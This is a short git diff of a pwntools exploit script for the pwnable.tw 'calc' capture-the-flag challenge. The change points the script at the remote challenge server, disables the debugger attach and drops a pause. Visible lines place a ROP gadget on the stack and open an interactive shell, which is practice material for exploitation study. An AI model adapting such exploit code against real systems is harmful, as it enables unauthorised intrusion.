@@ -2,8 +2,8 @@ from tabnanny import check
 from pwn import *
 context(arch = "i386", os = "Linux", log_level = "Debug")
 io = process("./calc")
-# io = remote("124.70.130.92", 60001)
-gdb.attach(io)
+io = remote("chall.pwnable.tw", 10100)
+# gdb.attach(io)
 
 s       = lambda data               :io.send(data)
 sa      = lambda delim,data         :io.sendafter(str(delim), data)
@@ -69,6 +69,5 @@ place(361, 8)
 #place data to 361 and add 360
 place(360, pop_eax)
 log.info("Stack Address : " + hex(stack))
-pause()
 sl("q")
 itr()
